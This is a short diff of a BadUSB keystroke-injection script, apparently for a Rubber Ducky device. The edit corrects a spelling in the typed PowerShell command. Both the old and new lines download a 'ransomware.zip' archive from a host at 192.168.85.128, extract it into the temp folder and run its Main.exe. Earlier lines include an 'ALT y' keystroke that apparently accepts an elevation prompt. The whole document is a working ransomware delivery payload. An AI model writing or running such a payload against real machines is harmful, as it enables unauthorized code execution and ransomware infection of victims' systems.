@@ -7,5 +7,5 @@ ENTER
 DELAY 500
 ALT y
 DELAY 500
-STRING Invoke-WebRequest -Uri http://192.168.85.128/ransonware.zip -OutFile $Env:temp\ransonware.zip ; Expand-Archive $Env:temp\ransonware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransonware\ ; .\Main.exe ; exit
+STRING Invoke-WebRequest -Uri http://192.168.85.128/ransomware.zip -OutFile $Env:temp\ransomware.zip ; Expand-Archive $Env:temp\ransomware.zip -dest $Env:temp\ -force ; cd $Env:temp\ransomware\ ; .\Main.exe ; exit
 ENTER
